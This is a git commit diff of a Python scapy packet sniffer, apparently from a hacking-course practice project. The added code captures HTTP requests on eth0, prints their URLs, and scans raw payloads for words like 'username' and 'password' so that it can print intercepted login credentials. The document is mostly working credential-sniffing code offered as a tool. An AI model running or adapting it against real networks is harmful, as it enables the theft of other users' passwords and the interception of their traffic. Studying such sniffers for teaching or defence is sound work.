dbd0b57791f9abd220f53bd1a3d3a836616f7888
Stefan <untilastefan8@gmail.com>
2025-05-20 13:56:20 -0400

    ....

--- packet-sniffer/packet_sniffer.py
+++ packet-sniffer/packet_sniffer.py
@@ -5,9 +5,24 @@ from scapy.layers import http
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packages)
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path
+
+def get_log_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "user", "login", "password", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
 def process_sniffed_packages(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
+        url = get_url(packet)
+        print("HTTP Request >> " + url)
+
+    login_info = get_log_info(packet)
+    if login_info:
+        print("\n\nPossible  username/password: " + login_info + "\n\n")
 
 sniff("eth0")
